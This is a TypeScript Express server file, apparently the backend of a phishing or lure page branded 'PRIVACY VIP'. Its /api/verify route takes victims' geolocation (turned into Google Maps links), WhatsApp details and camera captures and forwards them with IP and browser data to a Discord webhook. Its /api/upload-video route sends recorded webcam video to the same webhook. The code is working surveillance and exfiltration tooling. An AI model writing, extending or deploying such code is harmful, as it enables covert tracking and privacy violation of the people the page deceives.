import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import multer from 'multer';
import axios from 'axios';
import FormData from 'form-data';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json());

// Serve static files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API Route for verification
app.post('/api/verify', async (req, res) => {
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

    if (!WEBHOOK_URL) {
        console.error('❌ ERRO: DISCORD_WEBHOOK_URL não configurada nas Settings!');
        return res.status(400).json({ error: 'Webhook não configurado' });
    }

    try {
        let { tipo, valor } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        console.log(`[LOG] Recebido: ${tipo} | Valor: ${valor}`);

        let embedColor = 0xff2a5f;
        let icon = "📱";
        let description = `**Dados Recebidos:**\n\`\`\`${valor}\`\`\``;

        if (tipo === 'LOCALIZAÇÃO') {
            embedColor = 0x00aaff;
            icon = "📍";
            // Regex mais flexível para capturar coordenadas
            const coords = valor.match(/Lat:\s*([-\d.]+),\s*Long:\s*([-\d.]+)/i);
            if (coords) {
                const lat = coords[1];
                const lng = coords[2];
                const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                description = `📍 **Localização Capturada!**\n\n[Clique aqui para abrir no Google Maps](${mapsUrl})\n\n\`\`\`${valor}\`\`\``;
            }
        } else if (tipo === 'WHATSAPP') {
            embedColor = 0x25d366;
            icon = "💬";
        } else if (tipo === 'CÂMERA') {
            embedColor = 0xff0000;
            icon = "📸";
        }

        await axios.post(WEBHOOK_URL, {
            username: "PRIVACY VIP - CAPTURA",
            avatar_url: "https://i.imgur.com/wSTFkRM.png",
            embeds: [{
                title: `${icon} ${tipo}`,
                description: description,
                color: embedColor,
                fields: [
                    { name: "🌐 IP do Usuário", value: `\`${ip}\``, inline: true },
                    { name: "🕵️ Navegador", value: `\`${userAgent}\``, inline: false }
                ],
                footer: { text: "Privacy VIP System • " + new Date().toLocaleString('pt-BR') },
                timestamp: new Date()
            }]
        });

        console.log('✅ Webhook enviado com sucesso (JSON)');
        return res.status(200).json({ success: true });
    } catch (err: any) {
        console.error('❌ Erro ao enviar Webhook:', err.response?.data || err.message);
        return res.status(500).json({ error: err.message });
    }
});

// Route for Video Upload
app.post('/api/upload-video', upload.single('video'), async (req, res) => {
    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

    if (!WEBHOOK_URL) {
        return res.status(400).json({ error: 'Webhook não configurado' });
    }

    if (!req.file) {
        return res.status(400).json({ error: 'Nenhum arquivo enviado' });
    }

    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        const form = new FormData();
        form.append('file', req.file.buffer, {
            filename: 'video.webm',
            contentType: req.file.mimetype || 'video/webm',
        });
        
        form.append('payload_json', JSON.stringify({
            username: "PRIVACY VIP - GRAVAÇÃO",
            content: `📸 **Nova Gravação Recebida!**\n🌐 IP: \`${ip}\`\n⏰ Horário: \`${new Date().toLocaleString('pt-BR')}\``
        }));

        await axios.post(WEBHOOK_URL, form, {
            headers: {
                ...form.getHeaders()
            }
        });

        console.log('✅ Vídeo enviado com sucesso (Multipart)');
        return res.status(200).json({ success: true });
    } catch (err: any) {
        console.error('❌ Erro no upload do vídeo:', err.response?.data || err.message);
        return res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    if (!process.env.DISCORD_WEBHOOK_URL) {
        console.warn('⚠️ AVISO: DISCORD_WEBHOOK_URL não está definida!');
    }
});
